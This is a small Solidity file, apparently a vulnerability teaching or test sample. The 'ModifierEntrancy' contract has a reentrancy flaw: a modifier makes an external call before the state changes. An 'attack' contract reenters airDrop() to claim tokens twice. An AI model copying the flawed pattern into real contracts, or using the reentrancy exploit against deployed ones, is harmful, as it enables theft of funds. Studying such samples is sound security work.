pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  bytes32 constant id = keccak256(abi.encodePacked("Nu Token"));

  function airDrop() z() y() public {
    tokenBalance[msg.sender] += 20;
  }

  modifier y() {
    require(id == Bank(msg.sender).supportsToken());
    _;
  }

  modifier z {
    require(tokenBalance[msg.sender] == 0);
    _;
  }
}

contract Bank {
    function supportsToken() external pure returns(bytes32) {
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack {  
    struct Flags {
        bool hasBeenCalled;
    }
    Flags private flags;

    function supportsToken() external returns(bytes32) {
        if(!flags.hasBeenCalled) {
            flags.hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public {
        ModifierEntrancy(token).airDrop();
    }
}